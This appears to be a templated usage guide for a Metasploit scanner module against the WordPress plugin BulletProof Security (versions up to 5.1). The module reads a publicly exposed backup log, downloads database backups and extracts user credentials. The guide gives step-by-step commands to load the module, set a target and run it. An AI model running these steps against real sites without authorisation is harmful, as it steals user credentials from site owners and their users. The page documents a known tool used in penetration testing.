**The description of current metasploit exploit**
The Wordpress plugin BulletProof Security, versions <= 5.1, suffers from an information disclosure          vulnerability, in that the db_backup_log.txt is publicly accessible.  If the backup functionality          is being utilized, this file will disclose where the backup files can be downloaded.          After downloading the backup file, it will be parsed to grab all user credentials.

---

**The usage instruction:**

Start by loading the module:

```bash
use auxiliary/scanner/http/wp_bulletproofsecurity_backups
```

Then set the required options:

```bash
# Required parameters with no default value
set RHOSTS <your target host(s) here>
# Repeat for each required parameter from Step 1
```

Carefully review the following network-related parameters. These have default values but **may need to be changed** depending on your environment:

* RPORT – default: 80 - The target port (TCP)

If the defaults match your setup, you do **not** need to change them. Otherwise, override them using `set`.

Finally, run the exploit:

```bash
exploit
```
Note:
1. Please execute the command step by step.
2. You can change default value if need.
3. You need to pay attention to whether the default RPORT is consistent with the port where the current service is running.